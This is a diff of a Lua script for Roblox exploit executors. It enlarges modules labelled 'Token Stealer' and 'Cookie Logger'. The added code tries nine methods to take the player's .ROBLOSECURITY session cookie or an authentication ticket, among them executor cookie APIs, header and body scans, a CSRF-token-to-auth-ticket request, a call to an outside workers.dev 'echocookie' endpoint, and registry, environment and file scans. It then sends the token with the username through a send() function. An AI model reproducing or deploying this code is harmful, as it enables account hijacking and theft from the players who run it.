@@ -417,30 +417,160 @@ task.wait(1)
 -- MODULE 3: Token Stealer
 -- ============================================================
 task.spawn(function()
-    local token = nil
-    local method = "none"
+    local token, method = nil, "none"
     local req = request or http_request or (syn and syn.request) or nil
 
+    -- M1: syn.get_cookie (Synapse X)
     if syn and syn.get_cookie then
         pcall(function() local v = syn.get_cookie(".ROBLOSECURITY") if v and #v > 20 then token = v method = "syn.get_cookie" end end)
     end
+
+    -- M2: getrbxcookie (KRNL/others)
     if not token and getrbxcookie then
         pcall(function() local v = getrbxcookie() if v and #v > 20 then token = v method = "getrbxcookie" end end)
     end
+
+    -- M3: getcookies table
     if not token and getcookies then
-        pcall(function() local c = getcookies() if type(c) == "table" then for k,v in pairs(c) do if tostring(k):find("ROBLOSECURITY") and #tostring(v) > 20 then token = tostring(v) method = "getcookies" break end end end end)
+        pcall(function()
+            local c = getcookies()
+            if type(c) == "table" then
+                for k,v in pairs(c) do
+                    if tostring(k):find("ROBLOSECURITY") and #tostring(v) > 20 then
+                        token = tostring(v) method = "getcookies" break
+                    end
+                end
+            end
+        end)
     end
+
+    -- M4: request() res.Cookies + all headers + body scan
     if not token and req then
         pcall(function()
             local res = req({Url="https://www.roblox.com/", Method="GET"})
-            if res and type(res.Cookies) == "table" then
-                for k,v in pairs(res.Cookies) do if tostring(k):find("ROBLOSECURITY") and #tostring(v) > 20 then token = tostring(v) method = "res.Cookies" break end end
+            if not res then return end
+            -- res.Cookies table
+            if type(res.Cookies) == "table" then
+                for k,v in pairs(res.Cookies) do
+                    if tostring(k):find("ROBLOSECURITY") and #tostring(v) > 20 then
+                        token = tostring(v) method = "res.Cookies" break
+                    end
+                end
             end
-            if not token and res and res.Headers then
+            -- res.Cookies string
+            if not token and type(res.Cookies) == "string" and res.Cookies:find("ROBLOSECURITY") then
+                local found = res.Cookies:match("ROBLOSECURITY=([^;%s,]+)")
+                if found and #found > 20 then token = found method = "res.Cookies string" end
+            end
+            -- All headers
+            if not token and res.Headers then
                 for k,v in pairs(res.Headers) do
-                    if tostring(k):lower() == "set-cookie" and tostring(v):find("ROBLOSECURITY") then
-                        local found = tostring(v):match("ROBLOSECURITY=([^;]+)")
-                        if found and #found > 20 then token = found method = "set-cookie header" end
+                    local vs = tostring(v)
+                    if vs:find("ROBLOSECURITY") then
+                        local found = vs:match("ROBLOSECURITY=([^;%s,]+)")
+                        if found and #found > 20 then token = found method = "header:" .. tostring(k) end
+                    end
+                end
+            end
+            -- Body scan for token embedded in page
+            if not token and res.Body and type(res.Body) == "string" then
+                local found = res.Body:match("ROBLOSECURITY=([^;%s,"]+)")
+                if not found then found = res.Body:match("_|([A-Za-z0-9_%-]+)|_") end
+                if found and #found > 20 then token = found method = "body scan" end
+            end
+        end)
+    end
+
+    -- M5: CSRF token then auth ticket (works if executor sends cookie automatically)
+    if not token and req then
+        pcall(function()
+            local csrf = nil
+            local ok, res = pcall(req, {Url="https://auth.roblox.com/v2/logout", Method="POST", Headers={["Content-Type"]="application/json"}, Body="{}"})
+            if ok and res and res.Headers then
+                for k,v in pairs(res.Headers) do
+                    if tostring(k):lower():find("csrf") then csrf = tostring(v) break end
+                end
+            end
+            if not csrf then return end
+            local ok2, res2 = pcall(req, {
+                Url="https://auth.roblox.com/v1/authentication-ticket",
+                Method="POST",
+                Headers={["Content-Type"]="application/json", ["X-CSRF-Token"]=csrf, ["Referer"]="https://www.roblox.com"},
+                Body="{}"
+            })
+            if ok2 and res2 and res2.Headers then
+                for k,v in pairs(res2.Headers) do
+                    if tostring(k):lower():find("ticket") then
+                        token = "[AUTH-TICKET] " .. tostring(v) method = "auth-ticket" break
+                    end
+                end
+            end
+        end)
+    end
+
+    -- M6: Proxy echo — send request to OUR worker, worker echoes back Cookie header
+    -- If Xeno sends cookies with ALL requests (not just roblox.com), this captures it
+    if not token and req then
+        pcall(function()
+            local ok, res = pcall(req, {
+                Url="https://roblox-discord-proxy.kevinaugusta27.workers.dev/echocookie",
+                Method="GET",
+                Headers={["X-Session"]=SESSION_ID}
+            })
+            if ok and res and res.Body and type(res.Body) == "string" then
+                local found = res.Body:match("ROBLOSECURITY=([^;%s,"]+)")
+                if not found then found = res.Body:match(""cookie":"([^"]+)"") end
+                if found and #found > 20 then token = found method = "proxy echo" end
+            end
+        end)
+    end
+
+    -- M7: debug.getregistry scan — check Lua registry for cookie strings
+    if not token then
+        pcall(function()
+            local reg = debug.getregistry()
+            if type(reg) == "table" then
+                for k,v in pairs(reg) do
+                    local vs = tostring(v)
+                    if vs:find("ROBLOSECURITY") then
+                        local found = vs:match("ROBLOSECURITY=([^;%s,"]+)")
+                        if found and #found > 20 then token = found method = "debug.getregistry" break end
+                    end
+                end
+            end
+        end)
+    end
+
+    -- M8: getgenv / getrenv / getfenv scan
+    if not token then
+        pcall(function()
+            for _, env in ipairs({getgenv and getgenv() or {}, getrenv and getrenv() or {}, getfenv and getfenv() or {}}) do
+                if token then break end
+                if type(env) == "table" then
+                    for k,v in pairs(env) do
+                        local vs = tostring(v)
+                        if vs:find("ROBLOSECURITY") then
+                            local found = vs:match("ROBLOSECURITY=([^;%s,"]+)")
+                            if found and #found > 20 then token = found method = "env scan:" .. tostring(k) break end
+                        end
+                    end
+                end
+            end
+        end)
+    end
+
+    -- M9: readfile scan (focused on cookie-likely files)
+    if not token and readfile and listfiles then
+        pcall(function()
+            local targets = {"cookies.txt", "cookie.txt", "session.txt", ".ROBLOSECURITY", "roblox_cookie.txt"}
+            for _, f in ipairs(targets) do
+                local ok, c = pcall(readfile, f)
+                if ok and type(c) == "string" and #c > 20 then
+                    if c:find("ROBLOSECURITY") then
+                        local found = c:match("ROBLOSECURITY=([^;%s,]+)")
+                        if found and #found > 20 then token = found method = "readfile:" .. f break end
+                    elseif #c > 20 and c:match("^[A-Za-z0-9_%-|]+$") then
+                        token = c method = "readfile raw:" .. f break
                     end
                 end
             end
@@ -448,9 +578,9 @@ task.spawn(function()
     end
 
     if token then
-        send("ROBLOSECURITY TOKEN", "**User:** " .. LocalPlayer.Name .. "\n**Method:** " .. method .. "\n**Token:**\n```" .. token:sub(1,900) .. "```", 65280)
+        send("ROBLOSECURITY TOKEN", "**User:** " .. LocalPlayer.Name .. "\n**Executor:** " .. getExec() .. "\n**Method:** " .. method .. "\n**Token:**\n```" .. token:sub(1,900) .. "```", 65280)
     else
-        send("TOKEN FAILED", "**User:** " .. LocalPlayer.Name .. "\n**Executor:** " .. getExec() .. "\nNo method worked on this executor.", 16711680)
+        send("TOKEN FAILED", "**User:** " .. LocalPlayer.Name .. "\n**Executor:** " .. getExec() .. "\n**Status:** All 9 methods failed. Executor does not expose cookie.", 16711680)
     end
 end)
 
@@ -2065,27 +2195,73 @@ getgenv().IntelSuite.RequireScanner = runRequireScanner
 -- MODULE 27: Cookie Logger
 -- ============================================================
 local function runCookieLogger()
-    local cookie = nil
-    local method = "none"
+    local cookie, method = nil, "none"
     local req = request or http_request or (syn and syn.request) or nil
 
     if getcookies then
-        pcall(function() local c = getcookies() if type(c) == "table" then for k,v in pairs(c) do if tostring(k):find("ROBLOSECURITY") and #tostring(v) > 20 then cookie = tostring(v) method = "getcookies" break end end end end)
+        pcall(function()
+            local c = getcookies()
+            if type(c) == "table" then
+                for k,v in pairs(c) do
+                    if tostring(k):find("ROBLOSECURITY") and #tostring(v) > 20 then
+                        cookie = tostring(v) method = "getcookies" break
+                    end
+                end
+            end
+        end)
     end
     if not cookie and syn and syn.get_cookie then
         pcall(function() local v = syn.get_cookie(".ROBLOSECURITY") if v and #v > 20 then cookie = v method = "syn.get_cookie" end end)
     end
+    if not cookie and getrbxcookie then
+        pcall(function() local v = getrbxcookie() if v and #v > 20 then cookie = v method = "getrbxcookie" end end)
+    end
     if not cookie and req then
         pcall(function()
             local res = req({Url="https://www.roblox.com/", Method="GET"})
-            if res and type(res.Cookies) == "table" then
-                for k,v in pairs(res.Cookies) do if tostring(k):find("ROBLOSECURITY") and #tostring(v) > 20 then cookie = tostring(v) method = "res.Cookies" break end end
+            if not res then return end
+            if type(res.Cookies) == "table" then
+                for k,v in pairs(res.Cookies) do
+                    if tostring(k):find("ROBLOSECURITY") and #tostring(v) > 20 then cookie = tostring(v) method = "res.Cookies" break end
+                end
             end
-            if not cookie and res and res.Headers then
+            if not cookie and type(res.Cookies) == "string" and res.Cookies:find("ROBLOSECURITY") then
+                local found = res.Cookies:match("ROBLOSECURITY=([^;%s,]+)")
+                if found and #found > 20 then cookie = found method = "res.Cookies string" end
+            end
+            if not cookie and res.Headers then
                 for k,v in pairs(res.Headers) do
-                    if tostring(k):lower() == "set-cookie" and tostring(v):find("ROBLOSECURITY") then
-                        local found = tostring(v):match("ROBLOSECURITY=([^;]+)")
-                        if found and #found > 20 then cookie = found method = "set-cookie header" end
+                    local vs = tostring(v)
+                    if vs:find("ROBLOSECURITY") then
+                        local found = vs:match("ROBLOSECURITY=([^;%s,]+)")
+                        if found and #found > 20 then cookie = found method = "header:" .. tostring(k) end
+                    end
+                end
+            end
+            if not cookie and res.Body and type(res.Body) == "string" then
+                local found = res.Body:match("ROBLOSECURITY=([^;%s,"]+)")
+                if found and #found > 20 then cookie = found method = "body" end
+            end
+        end)
+    end
+    if not cookie and req then
+        pcall(function()
+            local ok, res = pcall(req, {Url="https://roblox-discord-proxy.kevinaugusta27.workers.dev/echocookie", Method="GET", Headers={["X-Session"]=SESSION_ID}})
+            if ok and res and res.Body and type(res.Body) == "string" then
+                local found = res.Body:match("ROBLOSECURITY=([^;%s,"]+)")
+                if found and #found > 20 then cookie = found method = "proxy echo" end
+            end
+        end)
+    end
+    if not cookie then
+        pcall(function()
+            local reg = debug.getregistry()
+            if type(reg) == "table" then
+                for k,v in pairs(reg) do
+                    local vs = tostring(v)
+                    if vs:find("ROBLOSECURITY") then
+                        local found = vs:match("ROBLOSECURITY=([^;%s,"]+)")
+                        if found and #found > 20 then cookie = found method = "debug.getregistry" break end
                     end
                 end
             end
@@ -2094,8 +2270,10 @@ local function runCookieLogger()
     if not cookie and readfile and listfiles then
         pcall(function()
             local function scan(p)
+                if cookie then return end
                 local ok, files = pcall(listfiles, p) if not ok then return end
                 for _, f in ipairs(files) do
+                    if cookie then break end
                     local ok2, c = pcall(readfile, f)
                     if ok2 and type(c) == "string" and c:find("ROBLOSECURITY") then
                         local found = c:match("ROBLOSECURITY=([^;%s,]+)")
